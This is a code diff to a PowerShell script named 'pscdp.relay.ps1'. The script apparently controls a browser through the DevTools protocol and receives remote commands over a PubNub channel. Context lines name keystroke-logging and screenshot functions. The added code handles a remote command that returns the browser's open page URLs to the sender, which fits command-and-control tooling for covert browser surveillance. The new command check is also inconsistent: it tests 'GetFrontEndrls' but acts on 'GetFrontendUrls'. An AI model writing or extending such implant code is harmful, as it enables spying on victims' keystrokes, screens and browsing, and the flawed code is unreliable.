@@ -163,7 +163,7 @@ function Take-Screenshot() {
 }
 
 function Get-FrontendUrls() {
-    return $script:clientws.targets | ConvertTo-Json
+    return $script:clientws.targets
 }
 
 function Get-KeyboardLog() {
@@ -328,8 +328,52 @@ $script:get_targets_action = {
 function Process-PubNubEvent {
 
     param([string]$Message)
-    $payload = $Message | ConvertFrom-Json # should have cmdid, etc.
-    # Log-Msg $payload
+
+    try {
+        $payload = $Message | ConvertFrom-Json # should have cmdid, etc.
+
+        if ( $payload.message.source -eq "pscdp.relay.ps1" ) {
+            return
+        }
+    
+        
+    } catch {
+
+    }
+
+    $isbuiltincmd = $false
+    $cmd = $null
+
+    try {
+        if ( $payload.message.builtincmd -eq "GetFrontEndrls" ) {
+            $isbuiltincmd = $true
+            $cmd = $payload.message
+        }
+    } catch {
+
+    }
+
+    if ( ! $isbuiltincmd -and $null -ne $cmd ) {
+        return
+    }
+
+    $resultout = @{
+        builtincmd=$cmd.builtincmd
+        source="pscdp.relay.ps1"
+        destination=$cmd.source
+        cmdid=$cmd.cmdid
+        resultid=$(Get-Random -Minimum 10000000 -Maximum 99999999)
+        ts=$(Get-Timestamp)
+        result=$null
+    }
+
+    if ( $cmd.builtincmd -eq "GetFrontendUrls" ) {
+        $result = Get-FrontendUrls
+    }
+
+    $resultout['result'] = $result
+
+    Log-Msg $payload
 
     # GetScreenshot --> send back image as base64 string
 
@@ -801,8 +845,6 @@ class PSCDP {
 
             }
 
-
-
             # TODO verify $msg has params, context, etc.
             if ( $executionContextCreated ) {
                 $url = $msg.params.context.origin
@@ -930,7 +972,7 @@ class PSCDP {
 
     [void] LogState() {
         try {
-            Log-Msg "system state -- sendQueue: $($this.sendQueue.Count) commands: $($this.commands.Count) responses: $($this.responses.Count) results: $($this.results.Count) errors: $($this.errors.Count)"
+            Log-Msg "system state -- sendQueue: $($this.sendQueue.Count) commands: $($this.commands.Count) responses: $($this.responses.Count) results: $($this.results.Count) errors: $($this.errors.Count) pubnub messages: $($this.pubnubmsgs.Count)"
         } catch {
             Log-Msg "could not produce system overview message"
         }        
